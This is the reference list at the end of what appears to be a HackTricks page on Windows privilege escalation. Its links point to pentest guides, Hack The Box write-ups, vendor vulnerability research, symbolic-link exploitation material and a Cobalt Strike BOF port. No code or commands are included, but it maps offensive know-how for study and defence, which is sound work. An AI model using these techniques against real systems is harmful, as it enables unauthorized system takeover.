- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: macro VBA Word phishing via SMTP → déchiffrement des identifiants hMailServer → Veeam CVE-2023-27532 vers SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: leak de format-string + BOF de pile → ROP VirtualAlloc (RCE) et vol du token kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Vulnerabilité de système de fichiers privilégié présente dans un système SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – utilisation de CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Exploitation des liens symboliques sur Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (port BOF Cobalt Strike)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Modules Node.js : chargement depuis les dossiers `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json : `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
